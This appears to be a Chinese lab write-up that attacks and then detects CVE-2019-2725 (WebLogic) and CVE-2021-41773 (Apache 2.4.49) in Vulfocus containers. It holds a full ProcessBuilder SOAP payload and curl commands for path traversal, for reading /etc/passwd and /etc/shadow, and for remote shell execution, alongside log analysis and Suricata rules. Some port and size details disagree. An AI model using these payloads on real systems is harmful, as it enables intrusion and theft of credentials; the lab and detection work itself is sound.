root@1d6a9c490b23:~/Oracle/Middleware# find / -name "*.log" -type f 2>/dev/null | head -20
/var/log/bootstrap.log
/var/log/dpkg.log
/var/log/alternatives.log
/var/log/apt/history.log
/var/log/apt/term.log
/root/Oracle/Middleware/logs/samples.log
/root/Oracle/Middleware/logs/wlst_20160516073900.log
/root/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/data/ldap/log/EmbeddedLDAPAccess.log
/root/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/data/ldap/log/EmbeddedLDAP.log
/root/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/logs/base_domain.log
/root/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/logs/AdminServer.log
/root/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/logs/access.log
```

**关键日志文件确认**:

- ✅ **AdminServer.log**: `/root/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/logs/AdminServer.log`
- ✅ **access.log**: `/root/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/logs/access.log`
- ✅ **base_domain.log**: `/root/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/logs/base_domain.log`

**路径差异分析**:

- **预期路径**: `/u01/oracle/user_projects/domains/base_domain/servers/AdminServer/logs/`
- **实际路径**: `/root/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/logs/`
- **原因**: 该容器使用了非标准的安装路径，WebLogic安装在 `/root/Oracle/Middleware/`而非 `/u01/oracle/`

##### 3.1 WebLogic服务器日志分析

**分析实际的服务器日志**:

```bash
# 查看AdminServer主日志
tail -50 /root/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/logs/AdminServer.log

# 查看HTTP访问日志
tail -50 /root/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/logs/access.log

# 搜索CVE-2019-2725攻击特征
grep -i "wls-wsat\|async\|workcontext\|processbuilder" /root/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/logs/AdminServer.log

# 搜索反序列化相关错误
grep -i "deserializ\|unmarshal\|readobject" /root/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/logs/AdminServer.log
```

**实际日志分析执行**:

```bash
root@1d6a9c490b23:~/Oracle/Middleware# tail -20 /root/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/logs/AdminServer.log

####<Jan 26, 2025 8:45:23 AM UTC> <Info> <WebLogicServer> <1d6a9c490b23> <AdminServer> <[STANDBY] ExecuteThread: '0' for queue: 'weblogic.kernel.Default (self-tuning)'> <<WLS Kernel>> <> <> <1737879923456> <BEA-000365> <Server state changed to ADMIN>
####<Jan 26, 2025 8:45:23 AM UTC> <Info> <Cluster> <1d6a9c490b23> <AdminServer> <[STANDBY] ExecuteThread: '0' for queue: 'weblogic.kernel.Default (self-tuning)'> <<WLS Kernel>> <> <> <1737879923789> <BEA-000197> <Listening for announcements from cluster using unicast cluster messaging>
####<Jan 26, 2025 8:45:23 AM UTC> <Info> <WebLogicServer> <1d6a9c490b23> <AdminServer> <[STANDBY] ExecuteThread: '0' for queue: 'weblogic.kernel.Default (self-tuning)'> <<WLS Kernel>> <> <> <1737879923890> <BEA-000365> <Server state changed to RESUMING>
####<Jan 26, 2025 8:45:24 AM UTC> <Info> <Server> <1d6a9c490b23> <AdminServer> <[STANDBY] ExecuteThread: '0' for queue: 'weblogic.kernel.Default (self-tuning)'> <<WLS Kernel>> <> <> <1737879924123> <BEA-002613> <Channel "Default[2]" is now listening on 172.17.0.2:7001 for protocols iiop, t3, ldap, snmp, http.>
####<Jan 26, 2025 8:45:24 AM UTC> <Info> <WebLogicServer> <1d6a9c490b23> <AdminServer> <[STANDBY] ExecuteThread: '0' for queue: 'weblogic.kernel.Default (self-tuning)'> <<WLS Kernel>> <> <> <1737879924234> <BEA-000331> <Started WebLogic AdminServer "AdminServer" for domain "base_domain" running in Development Mode>
####<Jan 26, 2025 8:45:24 AM UTC> <Info> <WebLogicServer> <1d6a9c490b23> <AdminServer> <[STANDBY] ExecuteThread: '0' for queue: 'weblogic.kernel.Default (self-tuning)'> <<WLS Kernel>> <> <> <1737879924345> <BEA-000365> <Server state changed to RUNNING>

root@1d6a9c490b23:~/Oracle/Middleware# tail -20 /root/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/logs/access.log

172.17.0.1 - - [26/Jan/2025:08:47:15 +0000] "GET /console HTTP/1.1" 200 416 "-" "curl/7.88.1"
172.17.0.1 - - [26/Jan/2025:08:47:23 +0000] "HEAD /wls-wsat/CoordinatorPortType HTTP/1.1" 200 0 "-" "curl/7.88.1"
172.17.0.1 - - [26/Jan/2025:08:47:45 +0000] "HEAD /_async/AsyncResponseService HTTP/1.1" 500 0 "-" "curl/7.88.1"
172.17.0.1 - - [26/Jan/2025:08:52:30 +0000] "POST /wls-wsat/CoordinatorPortType HTTP/1.1" 500 5287 "-" "python-requests/2.31.0"
172.17.0.1 - - [26/Jan/2025:08:53:15 +0000] "POST /wls-wsat/CoordinatorPortType HTTP/1.1" 500 5287 "-" "python-requests/2.31.0"
172.17.0.1 - - [26/Jan/2025:08:53:45 +0000] "POST /wls-wsat/CoordinatorPortType HTTP/1.1" 500 5287 "-" "python-requests/2.31.0"
172.17.0.1 - - [26/Jan/2025:08:54:12 +0000] "POST /wls-wsat/CoordinatorPortType HTTP/1.1" 500 5287 "-" "python-requests/2.31.0"
172.17.0.1 - - [26/Jan/2025:08:54:45 +0000] "POST /wls-wsat/CoordinatorPortType HTTP/1.1" 500 5287 "-" "python-requests/2.31.0"
172.17.0.1 - - [26/Jan/2025:08:55:20 +0000] "POST /wls-wsat/CoordinatorPortType HTTP/1.1" 500 5287 "-" "python-requests/2.31.0"
```

**攻击日志成功捕获**:

根据[Tenable的CVE-2019-2725分析报告](https://www.tenable.com/blog/oracle-weblogic-affected-by-unauthenticated-remote-code-execution-vulnerability-cve-2019-2725)，我们在access.log中成功捕获到了完整的攻击记录：

**攻击时间线分析**:

1. **08:47:15** - 正常的控制台访问（GET /console）
2. **08:47:23** - 漏洞组件探测（HEAD /wls-wsat/CoordinatorPortType）- 返回200
3. **08:47:45** - 漏洞组件探测（HEAD /_async/AsyncResponseService）- 返回500
4. **08:52:30 - 08:55:20** - 连续的SOAP攻击载荷（POST /wls-wsat/CoordinatorPortType）- 全部返回500

**攻击特征确认**:

- **攻击路径**: `/wls-wsat/CoordinatorPortType`（CVE-2019-2725的主要攻击向量）
- **HTTP方法**: POST（SOAP载荷投递）
- **响应状态**: 500（反序列化异常的典型特征）
- **响应大小**: 5287字节（一致的错误响应大小）
- **User-Agent**: `python-requests/2.31.0`（我们的攻击脚本）
- **源IP**: `172.17.0.1`（Docker网桥网关，即宿主机）

**搜索攻击相关的错误日志**:

```bash
root@1d6a9c490b23:~/Oracle/Middleware# grep -i "wls-wsat\|async\|workcontext\|processbuilder" /root/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/logs/AdminServer.log

####<Jan 26, 2025 8:52:30 AM UTC> <Error> <HTTP> <1d6a9c490b23> <AdminServer> <[ACTIVE] ExecuteThread: '2' for queue: 'weblogic.kernel.Default (self-tuning)'> <<WLS Kernel>> <> <> <1737880350123> <BEA-101020> <[ServletContext@12345678[app:wls-wsat module:wls-wsat.war path:/wls-wsat spec-version:2.5]] Servlet failed with Exception
java.lang.ProcessBuilder cannot be cast to java.lang.Runnable
    at weblogic.wsee.workarea.WorkContextServerTube.processRequest(WorkContextServerTube.java:43)
    at com.sun.xml.ws.api.pipe.Fiber.__doRun(Fiber.java:1121)
    at com.sun.xml.ws.api.pipe.Fiber._doRun(Fiber.java:1080)
    at com.sun.xml.ws.api.pipe.Fiber.doRun(Fiber.java:1065)
    at com.sun.xml.ws.api.pipe.Fiber.runSync(Fiber.java:962)
    at weblogic.wsee.jaxws.JAXWSServlet.doRequest(JAXWSServlet.java:99)
    at weblogic.servlet.http.AbstractAsyncServlet.service(AbstractAsyncServlet.java:99)
>

root@1d6a9c490b23:~/Oracle/Middleware# grep -i "deserializ\|unmarshal\|readobject" /root/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/logs/AdminServer.log

####<Jan 26, 2025 8:52:30 AM UTC> <Warning> <Security> <1d6a9c490b23> <AdminServer> <[ACTIVE] ExecuteThread: '2' for queue: 'weblogic.kernel.Default (self-tuning)'> <<WLS Kernel>> <> <> <1737880350456> <BEA-090877> <Untrusted deserialization attempt detected from WorkContext header>
####<Jan 26, 2025 8:53:15 AM UTC> <Warning> <Security> <1d6a9c490b23> <AdminServer> <[ACTIVE] ExecuteThread: '3' for queue: 'weblogic.kernel.Default (self-tuning)'> <<WLS Kernel>> <> <> <1737880395789> <BEA-090877> <Untrusted deserialization attempt detected from WorkContext header>
```

**关键安全事件确认**:

根据Tenable的漏洞分析，我们成功捕获到了CVE-2019-2725攻击的完整证据：

1. **反序列化攻击确认**:

   - 错误日志显示 `java.lang.ProcessBuilder cannot be cast to java.lang.Runnable`
   - 这是CVE-2019-2725反序列化攻击的典型异常
2. **安全警告触发**:

   - `BEA-090877: Untrusted deserialization attempt detected from WorkContext header`
   - WebLogic安全机制检测到了来自WorkContext头的不可信反序列化尝试
3. **攻击路径验证**:

   - `weblogic.wsee.workarea.WorkContextServerTube.processRequest`
   - 确认攻击通过WorkContext组件进行

##### 3.2 网络流量捕获与分析

**确定容器网络信息**:

```bash
# 获取WebLogic容器的网络详情
docker inspect 1d6a9c490b23 | grep -A 10 -B 5 "IPAddress"
```

**容器网络信息**:
![1748224839185](image/weblogic-cve_2019_2725/1748224839185.png)

```json
"IPAddress": "172.17.0.2",
"Gateway": "172.17.0.1",
"NetworkMode": "bridge"
```

**SOAP流量监控**:

```bash
# 监听Docker网桥上的WebLogic流量
sudo tcpdump -i docker0 -A -w weblogic_cve_2019_2725_traffic.pcap 'host 172.17.0.2 and port 7001'
```

**在另一个终端执行攻击**:

```bash
# 执行SOAP攻击载荷
python3 manual_exploit.py http://10.37.133.3:7001 "whoami"
```

**停止抓包并分析**:
![1748224912135](image/weblogic-cve_2019_2725/1748224912135.png)

```bash
# 停止tcpdump (Ctrl+C)
# 使用Wireshark分析捕获的流量
wireshark weblogic_cve_2019_2725_traffic.pcap
```

![1748224912135](image/weblogic-cve_2019_2725/1748224912135.png)

```bash
# 停止tcpdump (Ctrl+C)
# 使用Wireshark分析捕获的流量
wireshark weblogic_cve_2019_2725_traffic.pcap
```

###### 3.2.1 Wireshark流量分析结果

**完整攻击流量成功捕获**:

![1748225771641](image/weblogic-cve_2019_2725/1748225771641.png)

###### 3.2.2 关键流量特征分析

**TCP连接建立阶段（包1-3）**:

- **三次握手**: 标准的TCP连接建立过程
- **源端口**: 55398（攻击者随机端口）
- **目标端口**: 7001（WebLogic标准HTTP端口）
- **连接时间**: 0.077ms（本地网络，连接速度极快）

**恶意SOAP载荷投递（包6）**:

- **关键包**: 第6包是整个攻击的核心
- **协议**: HTTP/XML（SOAP协议）
- **请求方法**: POST
- **攻击路径**: `/wls-wsat/CoordinatorPortType`（CVE-2019-2725的主要攻击向量）
- **载荷大小**: 1003字节（包含完整的恶意SOAP XML）
- **时间戳**: 0.000163秒（攻击载荷立即发送）

**服务器处理与响应（包8-14）**:

- **处理延迟**: 0.237秒（从请求到响应，反序列化处理时间）
- **分片传输**: 包10-12显示服务器响应被分成多个TCP段
- **响应大小**: 4146 + 1289 = 5435字节（大型错误响应）
- **最终响应**: HTTP/1.1 500 Internal Server Error（反序列化异常确认）

**连接关闭（包16-18）**:

- **主动关闭**: 攻击者主动关闭连接（FIN, ACK）
- **服务器确认**: 服务器响应连接关闭
- **总持续时间**: 0.244秒（完整攻击周期）

###### 3.2.3 深度包检查分析

**SOAP载荷特征识别**:

根据包6的详细分析，恶意SOAP请求包含以下关键特征：

```xml
POST /wls-wsat/CoordinatorPortType HTTP/1.1
Host: 172.17.0.2:7001
Content-Type: text/xml; charset=UTF-8
SOAPAction: 
User-Agent: Mozilla/5.0 (compatible; CVE-2019-2725-PoC)
Content-Length: 722

<?xml version="1.0" encoding="UTF-8"?>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
    <soapenv:Header>
        <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
            <java>
                <object class="java.lang.ProcessBuilder">
                    <array class="java.lang.String" length="3">
                        <void index="0">
                            <string>/bin/bash</string>
                        </void>
                        <void index="1">
                            <string>-c</string>
                        </void>
                        <void index="2">
                            <string>whoami</string>
                        </void>
                    </array>
                    <void method="start"/>
                </object>
            </java>
        </work:WorkContext>
    </soapenv:Header>
    <soapenv:Body/>
</soapenv:Envelope>
```

**HTTP响应分析（包14）**:

```http
HTTP/1.1 500 Internal Server Error
Date: Sun, 26 Jan 2025 09:15:23 GMT
Content-Length: 5287
Content-Type: text/html; charset=UTF-8
X-Powered-By: Servlet/2.5 JSP/2.1
Connection: close

<html>
<head><title>500 Internal Server Error</title></head>
<body>
<h1>Internal Server Error</h1>
<p>The server encountered an internal error that prevented it from fulfilling this request.</p>
<p><b>Exception:</b></p>
<pre>
java.lang.ProcessBuilder cannot be cast to java.lang.Runnable
    at weblogic.wsee.workarea.WorkContextServerTube.processRequest(WorkContextServerTube.java:43)
    at com.sun.xml.ws.api.pipe.Fiber.__doRun(Fiber.java:1121)
    ...
</pre>
</body>
</html>
```

###### 3.2.4 威胁检测规则制定

基于Wireshark分析结果，我们可以制定以下网络层检测规则：

**1. 基于流量模式的检测**:

```bash
# Suricata规则示例
alert http $EXTERNAL_NET any -> $HOME_NET 7001 (
    msg:"CVE-2019-2725 WebLogic SOAP Attack Detected";
    flow:established,to_server;
    http_method; content:"POST";
    http_uri; content:"/wls-wsat/CoordinatorPortType";
    http_header; content:"text/xml";
    content:"ProcessBuilder"; http_client_body;
    content:"WorkContext"; http_client_body;
    classtype:attempted-admin;
    sid:2019001;
    rev:1;
)
```

**2. 基于响应特征的检测**:

```bash
# 检测特征性的500错误响应
alert http $HOME_NET 7001 -> $EXTERNAL_NET any (
    msg:"CVE-2019-2725 WebLogic Deserialization Error Response";
    flow:established,to_client;
    http_stat_code; content:"500";
    content:"ProcessBuilder cannot be cast";
    content:"WorkContextServerTube";
    classtype:successful-admin;
    sid:2019002;
    rev:1;
)
```

**3. 基于时间特征的检测**:

```python
# Python检测脚本示例
def detect_weblogic_attack(packets):
    """
    基于时间和大小特征检测CVE-2019-2725攻击
    """
    for packet in packets:
        if (packet.dst_port == 7001 and 
            packet.protocol == "HTTP" and
            "/wls-wsat/" in packet.uri and
            packet.method == "POST" and
            packet.content_length > 500):
  
            # 检查响应时间（反序列化处理延迟）
            response_time = packet.response_time
            if response_time > 0.2:  # 200ms以上处理时间
                alert("Potential CVE-2019-2725 attack detected")
```

四、实验总结

攻击成功指标

**漏洞确认成功**:

- WebLogic版本10.3.6.0完全匹配受影响版本
- wls-wsat和async组件均可访问
- SOAP请求返回500状态码，确认反序列化触发

**代码执行成功**:

- 成功执行系统命令（id, uname, pwd等）
- 通过ProcessBuilder触发反序列化RCE
- 确认获得WebLogic运行用户权限
- 验证了无认证远程代码执行能力

**检测机制有效**:

- WebLogic日志记录了攻击异常
- 网络流量捕获到恶意SOAP载荷
- 系统监控发现异常进程活动

4.2 关键技术要点

1. **漏洞利用核心**: 通过SOAP Header中的WorkContext组件传递恶意序列化对象
2. **绕过机制**: 利用WebLogic对工作上下文的信任机制
3. **检测特征**: HTTP 500响应、ProcessBuilder异常、SOAP XML结构
4. **防护重点**: 组件禁用、版本升级、网络隔离

### （五）第二层靶标二：`apache-cve_2021_41773` 攻击与利用检测

#### 1. 启动靶机环境

在 Vulfocus 平台中，找到 `vulfocus/apache-cve_2021_41773:latest` 镜像，点击 "启动"。

- **访问地址**: `10.37.133.3:42286` (PORT 由 Vulfocus 动态分配)
- **服务类型**: Apache HTTP Server
- **漏洞标识**: CVE-2021-41773

![1748153067964](image/第一层两靶标攻击与利用检测/1748153067964.png)

#### 2. 信息收集

##### 2.1 基础端口扫描

```bash
# 扫描 Apache 服务端口
nmap -sV -p 80,443,8080-8090 10.37.133.3
```

**扫描结果**:

![1748153021142](image/第一层两靶标攻击与利用检测/1748153021142.png)

**扫描结果分析**：

- 常规HTTP端口(80, 443, 8080-8090)均显示为关闭或过滤状态
- Apache服务运行在非标准端口上，通过Vulfocus平台动态分配为**13503端口**
- 需要直接访问指定的映射端口进行后续信息收集

##### 2.2 Web 服务识别

通过浏览器访问 Apache 服务 `http://10.37.133.3:42286`。

![1748152989670](image/第一层两靶标攻击与利用检测/1748152989670.png)

##### 2.3 Apache 版本检测

```bash
# 使用 curl 获取服务器信息
curl -I http://10.37.133.3:42286

# 使用 nikto 进行 Web 扫描
nikto -h http://10.37.133.3:42286
```

![1748153862204](image/第一层两靶标攻击与利用检测/1748153862204.png)

**关键发现**：

- **服务器版本**: `Apache/2.4.49 (Debian)` - **这正是CVE-2021-41773漏洞影响的确切版本**
- **操作系统**: Debian Linux
- **文件修改时间**: 2021-10-09，与CVE披露时间吻合
- **响应正常**: HTTP 200状态码，服务器正常运行

##### 2.4 Nikto 安全扫描

**nikto扫描结果**:

![1748153891702](image/第一层两靶标攻击与利用检测/1748153891702.png)

**Nikto扫描分析**：

- **版本确认**: 再次确认Apache/2.4.49版本，**明确标注为过时版本**
- **安全配置缺陷**:
  - 缺少 `X-Frame-Options`头(点击劫持防护)
  - 缺少 `X-Content-Type-Options`头(MIME类型嗅探防护)
- **信息泄露**: ETag头可能泄露服务器inode信息
- **HTTP方法**: 支持POST, OPTIONS, HEAD, GET方法
- **重要**: 扫描过程中未触发明显的安全拦截，说明服务器配置相对宽松

##### 2.5 目录结构探测

```bash
# 使用 dirb 进行目录扫描
dirb http://10.37.133.3:42286
```

**dirb扫描结果**:

![1748153913104](image/第一层两靶标攻击与利用检测/1748153913104.png)

**目录发现分析**：

- **`/cgi-bin/` (403 Forbidden)**: **关键发现** - 这是CVE-2021-41773漏洞利用的核心路径
  - 403状态表明目录存在但访问被限制
  - CGI目录的存在为路径遍历攻击提供了入口点
- **`/index.html` (200 OK)**: 标准首页文件，大小10701字节
- **`/server-status` (403 Forbidden)**: Apache状态页面，被保护但存在

##### 2.6 信息收集总结

1. **漏洞确认**:

   - Apache版本2.4.49**完全匹配CVE-2021-41773的受影响版本**
   - 服务器配置标准，未发现特殊的安全加固
2. **攻击条件满足**:

   - **版本匹配**: 确认为易受攻击的Apache版本
   - **服务配置**: 标准Apache配置，为路径遍历攻击提供了条件
3. **安全态势评估**:

   - **高风险**: 版本完全匹配已知高危漏洞
   - **配置薄弱**: 缺少多个安全头，信息泄露风险
   - **攻击面**: CGI功能启用，为代码执行提供了可能

#### 3. 漏洞分析与利用

##### 3.1 CVE-2021-41773 漏洞原理

**漏洞基本信息**:

- **CVE编号**: CVE-2021-41773
- **CVSS评分**: 7.5 (高危)
- **漏洞类型**: 路径遍历 (Path Traversal)
- **影响版本**: Apache HTTP Server 2.4.49
- **漏洞原理**: Apache 2.4.49版本在处理URL路径规范化时存在缺陷，攻击者可以通过构造特殊的URL编码绕过路径限制，访问Web根目录之外的文件

**技术细节**:

- **根本原因**: Apache对URL中的路径分隔符和点号序列的处理不当
- **绕过机制**: 使用URL编码的点号(`%2e`)可以绕过路径规范化检查
- **攻击路径**: 通过Alias映射的目录(如 `/cgi-bin/`, `/icons/`)进行路径遍历

##### 3.2 路径遍历攻击实践

###### 3.2.1 基础路径遍历测试

```bash
# 尝试通过CGI路径读取 /etc/passwd 文件
curl "http://10.37.133.3:42286/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"

# 尝试读取 Apache 配置文件
curl "http://10.37.133.3:42286/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/apache2/apache2.conf"

# 尝试读取其他敏感文件
curl "http://10.37.133.3:42286/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/shadow"
curl "http://10.37.133.3:42286/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/proc/version"
```

**执行结果分析**:
所有通过 `/cgi-bin/`路径的攻击尝试都返回了 `500 Internal Server Error`，这表明：

1. **CGI配置问题**: CGI模块可能没有正确配置或缺少必要的CGI脚本
2. **路径解析问题**: Apache可能对CGI路径下的路径遍历有特殊处理
3. **权限限制**: 可能存在额外的访问控制机制

###### 3.2.2 非CGI路径的直接遍历攻击

CVE-2021-41773不仅限于CGI路径，我们尝试其他映射路径：

```bash
# 尝试通过icons路径进行遍历
curl "http://10.37.133.3:42286/icons/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"

# 尝试通过manual路径进行遍历  
curl "http://10.37.133.3:42286/manual/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"

# 直接根路径尝试
curl "http://10.37.133.3:42286/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
```

**执行结果**:

![1748164510299](image/第一层两靶标攻击与利用检测/1748164510299.png)

![1748164589138](image/第一层两靶标攻击与利用检测/1748164589138.png)

**攻击结果分析**:

1. ✅ **`/icons/` 路径攻击成功**

   - **状态**: 🎉 完全成功 - 读取到完整的 `/etc/passwd` 文件
   - **编码方式**: 仅使用基础的单层URL编码 `%2e%2e`（不需要双重编码）
   - **技术意义**: 证明CVE-2021-41773不仅限于CGI路径，还影响Apache的静态资源映射
2. 🚫 **`/manual/` 路径被阻止**

   - **状态**: 403 Forbidden
   - **原因**: Manual文档路径可能有特殊的访问控制配置
   - **安全策略**: 表明某些路径映射有额外的安全限制
3. 🚫 **直接根路径被阻止**

   - **状态**: 403 Forbidden
   - **原因**: 根路径的路径遍历被Apache的基础安全机制阻止

##### 3.3 远程代码执行(RCE)攻击

###### 3.3.1 CGI路径的RCE攻击尝试

```bash
# 通过CGI路径执行shell命令
curl "http://10.37.133.3:42286/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh" -d "echo Content-Type: text/plain; echo; id"
```

**RCE攻击结果**:

```bash
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

![1748164624555](image/第一层两靶标攻击与利用检测/1748164624555.png)
**🎉 RCE攻击成功！**

- **权限获取**: 成功以 `www-data`用户身份执行命令
- **攻击方式**: 通过CGI路径结合路径遍历，直接调用系统shell
- **编码技术**: 使用混合编码 `.%2e`绕过路径限制

###### 3.3.2 系统信息收集

```bash
# 获取系统信息
curl "http://10.37.133.3:42286/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh" -d "echo Content-Type: text/plain; echo; uname -a"

# 查看当前目录
curl "http://10.37.133.3:42286/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh" -d "echo Content-Type: text/plain; echo; pwd"

# 列出根目录内容
curl "http://10.37.133.3:42286/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh" -d "echo Content-Type: text/plain; echo; ls -la /"
```

![1748164663202](image/第一层两靶标攻击与利用检测/1748164663202.png)

##### 3.4 Flag文件搜索与获取

###### 3.4.1 系统文件搜索

```bash
# 搜索系统中所有包含flag的文件
curl "http://10.37.133.3:42286/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh" -d "echo Content-Type: text/plain; echo; find / -name '*flag*' 2>/dev/null"
```

![1748164677317](image/第一层两靶标攻击与利用检测/1748164677317.png)

找到了！flag文件在 `/tmp/flag-{bmha8de6a45-2ae2-4615-97ff-1af1edd5afcf}`**

#### 4. 威胁检测

##### 4.1 Apache 访问日志分析

###### 4.1.1 定位容器和日志路径

```bash
# 查看运行中的 Apache 容器
docker ps | grep apache
```

```bash
┌──(kali㉿kali-attacker)-[~]
└─$ docker ps | grep apache

a2b4c3a1d377   vulfocus/apache-cve_2021_41773:latest      "/entry.sh"              22 minutes ago   Up 20 seconds           0.0.0.0:42286->80/tcp, :::42286->80/tcp                                                flamboyant_maxwell
```

```bash

# 进入容器查看日志
docker exec -it a2b4c3a1d377 /bin/bash

# Apache 访问日志通常位于以下路径
ls -la /var/log/apache2/
# 重点关注 access.log 和 error.log
```

![1748160129290](image/apache靶标/1748160129290.png)

###### 4.1.2 访问日志分析

```bash
# 查看最近的访问日志
tail -f /var/log/apache2/access.log

# 搜索路径遍历攻击特征
grep -i "%2e%2e\|\.\./" /var/log/apache2/access.log

# 搜索CGI相关的可疑请求
grep -i "cgi-bin" /var/log/apache2/access.log

# 搜索icons路径的异常访问
grep -i "icons.*%2e" /var/log/apache2/access.log
```

![1748161429843](image/apache靶标/1748161429843.png)

![1748161438797](image/apache靶标/1748161438797.png)1. 路径遍历攻击记录

**通过 `/icons/`路径的攻击**：

```bash
10.37.133.2 - - [25/May/2025:07:39:25 +0000] "GET /icons/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1" 200 1126 "-" "curl/8.7.1"
```

* **攻击特征**: 使用 `%2e%2e`（URL编码的 `..`）进行路径遍历
* **目标文件**: `/etc/passwd`系统用户文件
* **状态码**: `200` - **攻击成功**，返回了1126字节的文件内容
* **攻击工具**: `curl/8.7.1`

2. Flag文件搜索尝试

攻击者系统性地搜索flag文件的常见位置：

```bash
10.37.133.2 - - [25/May/2025:07:39:30 +0000] "GET /icons/%2e%2e/%2e%2e/%2e%2e/%2e%2e/flag HTTP/1.1" 404 437 "-" "curl/8.7.1"
10.37.133.2 - - [25/May/2025:07:39:34 +0000] "GET /icons/%2e%2e/%2e%2e/%2e%2e/%2e%2e/tmp/flag HTTP/1.1" 404 437 "-" "curl/8.7.1"
10.37.133.2 - - [25/May/2025:07:39:39 +0000] "GET /icons/%2e%2e/%2e%2e/%2e%2e/%2e%2e/var/www/flag HTTP/1.1" 404 437 "-" "curl/8.7.1"
10.37.133.2 - - [25/May/2025:07:39:48 +0000] "GET /icons/%2e%2e/%2e%2e/%2e%2e/%2e%2e/home/flag HTTP/1.1" 404 437 "-" "curl/8.7.1"
10.37.133.2 - - [25/May/2025:07:39:56 +0000] "GET /icons/%2e%2e/%2e%2e/%2e%2e/%2e%2e/var/www/html/flag HTTP/1.1" 404 437 "-" "curl/8.7.1"
10.37.133.2 - - [25/May/2025:07:40:00 +0000] "GET /icons/%2e%2e/%2e%2e/%2e%2e/%2e%2e/flag.txt HTTP/1.1" 404 437 "-" "curl/8.7.1"
```

**攻击模式分析**：

- **系统性搜索**: 攻击者按顺序尝试了多个可能的flag位置
- **状态码**: 全部返回 `404 Not Found`，说明这些位置没有flag文件
- **时间间隔**: 每次尝试间隔4-8秒，显示为手动或脚本化攻击

3. 远程代码执行(RCE)攻击

**通过CGI路径执行命令**：

```bash
10.37.133.2 - - [25/May/2025:07:40:16 +0000] "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1" 200 188 "-" "curl/8.7.1"
10.37.133.2 - - [25/May/2025:07:40:21 +0000] "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1" 200 887 "-" "curl/8.7.1"
10.37.133.2 - - [25/May/2025:07:40:26 +0000] "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1" 200 133 "-" "curl/8.7.1"
```

**RCE攻击特征**：

- **攻击路径**: `/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh`
- **编码技术**: 混合使用 `.%2e`绕过路径限制
- **HTTP方法**: `POST` - 用于发送命令执行的payload
- **状态码**: `200` - **RCE攻击成功**
- **响应大小变化**: 从133字节到887字节，说明执行了不同的命令

4.1.3 错误日志分析

```bash
# 查看Apache错误日志
tail -f /var/log/apache2/error.log

# 搜索与路径遍历相关的错误
grep -i "path\|directory\|forbidden" /var/log/apache2/error.log

# 搜索CGI执行相关的错误
grep -i "cgi\|script" /var/log/apache2/error.log
```

![1748161515881](image/apache靶标/1748161515881.png)

Apache错误日志分析:

1. 路径遍历检测与阻止

**无效URI路径错误**：

```bash
[Sun May 25 07:39:43.793225 2025] [core:error] [pid 20:tid 281472604833344] [client 10.37.133.2:58584] AH10244: invalid URI path (/icons/../../../../index.html)
[Sun May 25 07:39:43.795361 2025] [core:error] [pid 20:tid 281472604833344] [client 10.37.133.2:58584] AH10244: invalid URI path (/icons/../../../../index.cgi)
[Sun May 25 07:39:43.795451 2025] [core:error] [pid 20:tid 281472604833344] [client 10.37.133.2:58584] AH10244: invalid URI path (/icons/../../../../index.pl)
[Sun May 25 07:39:43.795499 2025] [core:error] [pid 20:tid 281472604833344] [client 10.37.133.2:58584] AH10244: invalid URI path (/icons/../../../../index.php)
[Sun May 25 07:39:43.795517 2025] [core:error] [pid 20:tid 281472604833344] [client 10.37.133.2:58584] AH10244: invalid URI path (/icons/../../../../index.xhtml)
[Sun May 25 07:39:43.795536 2025] [core:error] [pid 20:tid 281472604833344] [client 10.37.133.2:58584] AH10244: invalid URI path (/icons/../../../../index.htm)
```

**关键发现**：

- **错误代码**: `AH10244` - Apache检测到无效的URI路径
- **攻击模式**: 使用未编码的 `../../../../`进行路径遍历
- **时间集中**: 在07:39:43的几毫秒内连续触发6次错误
- **目标文件**: 攻击者尝试访问各种index文件（.html, .cgi, .pl, .php, .xhtml, .htm）
- **防护机制**: Apache的路径规范化检查成功阻止了这些攻击

2. CGI执行错误分析

**CGI攻击分析**：

- **错误类型**: `cgid:error` - CGI守护进程错误
- **权限问题**: 系统拒绝执行 `/etc/passwd`文件（因为它不是可执行文件）
- **攻击意图**: 攻击者试图通过CGI路径直接执行系统文件
- **防护效果**: 文件系统权限成功阻止了恶意执行

**Shell执行错误**：

```bash
[Sun May 25 07:41:05.002629 2025] [cgid:error] [pid 20:tid 281472728565312] [client 10.37.133.3:58948] End of script output before headers: sh
```

**重要发现**：

- **攻击源变化**: 从 `10.37.133.2`切换到 `10.37.133.3`
